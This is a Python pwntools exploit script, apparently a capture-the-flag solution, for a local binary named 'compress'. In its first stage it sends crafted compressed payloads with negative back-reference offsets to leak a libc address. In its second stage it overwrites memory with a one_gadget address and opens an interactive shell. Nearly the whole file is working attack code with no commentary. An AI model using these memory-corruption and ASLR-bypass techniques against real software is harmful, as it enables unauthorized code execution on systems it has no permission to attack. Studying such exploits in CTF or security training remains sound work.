import struct
from pwn import *

HEADER = b'54494e59'
DELIM = b'ff'
END = b'ff0000'

def encode(x):
    bits = bin(x & 0xffffffffffffffff)[2:]
    bits = bits.rjust(len(bits) + 7 - len(bits) % 7, '0')

    encoded = ''
    if len(bits) > 7:
        encoded += '1' + bits[-7:]
        for i in range(1, len(bits) // 7 - 1):
            encoded += '1' + bits[-7*(i + 1):-7*i]

    encoded += '0' + bits[:7]
    encoded = hex(int(encoded, 2))[2:].rjust(2, '0')

    return encoded.encode()


p = process('./compress')

# First stage
p.sendlineafter(b'documentation\n\n', b'2')

payload = HEADER
payload += b'AB' + DELIM + encode(-0x1030) + encode(0x10)
payload += b'AB' + DELIM + encode(1) + encode(0xfee)
payload += DELIM + encode(-8) + encode(8)
payload += DELIM + encode(8) + encode(8)
payload += DELIM + encode(-8) + encode(8)
payload += DELIM + encode(8) + encode(8)
payload += DELIM + encode(8) + encode(8)
payload += DELIM + encode(8) + encode(8)
payload += DELIM + encode(8) + encode(8)
payload += DELIM + encode(-7*8) + encode(8)
payload += END

p.sendlineafter(b'4k):\n', payload)
p.recvuntil(b'\n')

leak = p.recvuntil(b'\n')[16:].decode('utf-8')
leak_bytes = [leak[2*i:2*(i+1)] for i in range(len(leak) // 2)]
libc = int(''.join(leak_bytes[:8][::-1]), 16) - 0x270b3
log.info('libc @ ' + hex(libc))
one_gadget = libc + 0xe6c7e
log.info('one_gadget @ ' + hex(one_gadget))

# Second stage
p.sendlineafter(b'documentation\n\n', b'2')

payload = HEADER
payload += b'AB' + DELIM + encode(-0x1030) + encode(0x10)
payload += hex(struct.unpack('>Q', struct.pack('<Q', one_gadget))[0])[2:].encode()
payload += b'AB' + DELIM + encode(1) + encode(0xfe6)
payload += DELIM + encode(-8) + encode(8)
payload += DELIM + encode(8) + encode(8)
payload += DELIM + encode(-8) + encode(8)
payload += DELIM + encode(8) + encode(8)
payload += DELIM + encode(8) + encode(8)
payload += DELIM + encode(8) + encode(8)
payload += DELIM + encode(8) + encode(8)
payload += DELIM + encode(0x1027) + encode(8)
payload += END

p.sendlineafter(b'4k):\n', payload)
for _ in range(2):
    p.recvuntil(b'\n')

p.interactive()

